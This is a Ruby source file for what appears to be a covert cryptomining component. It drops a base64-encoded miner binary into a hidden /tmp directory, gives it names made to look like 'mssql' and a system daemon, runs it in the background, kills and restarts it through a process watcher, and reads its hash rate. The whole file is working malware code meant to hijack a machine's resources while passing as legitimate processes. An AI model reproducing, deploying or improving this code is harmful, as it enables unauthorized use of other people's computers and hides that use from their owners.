module Blackstar
  class Miner
    attr_reader :miner_path, :config_path, :output_miner_path, :base_path, :host
    attr_accessor :miner_started

    def initialize(host)
      @host = host
      @base_path = "/tmp/ri0eigreigrei321__"
      @miner_path = "#{base_path}/mssql"
      @config_path = "#{base_path}/config.json"
      @output_miner_path = "#{base_path}/systemmd20"
      @miner_started = false
    end

    def init
      remove_old_files
      copy_new_files
    end

    def run_loop
      kill_process
      start_mine
      process_detector = Blackstar::ProcessDetector.new(self)

      i = 1
      process_detector.watch do
        i += 1
        if i == 20
          yield
          i = 1
        end
      end
    end

    def start_mine
      self.miner_started = true
      Cmd.call_forked("#{miner_path} > #{output_miner_path}")
      p "Started Miner"
    end

    def remove_old_files
      [miner_path, config_path, output_miner_path].each do |path|
        `rm -f #{path}`
      end
    end

    def copy_new_files
      `mkdir -p #{base_path}`
      File.open(miner_path, 'w') do |f|
        f.write(Base64::decode(LINUX_MINER_BASE64))
      end

      host.generate_config(config_path)

      `chmod +x #{miner_path}`
      `touch #{output_miner_path}`
    end

    def get_hash_rate
      output = nil
      File.open(output_miner_path, 'r') do |f|
        output = f.read
      end

      File.open(output_miner_path, 'w') do |f|
        f.write('')
      end

      good_line = output.match(/speed .* H\/s/)
      if good_line
        good_line.to_s.scan(/\d+/)[4]
      else
        0
      end
    end

    def kill_process
      pid = `pgrep mssql`
      if pid != ''
        `kill -9 #{pid}`
        p 'Killed Miner'
        self.miner_started = false
      end
    end
  end
end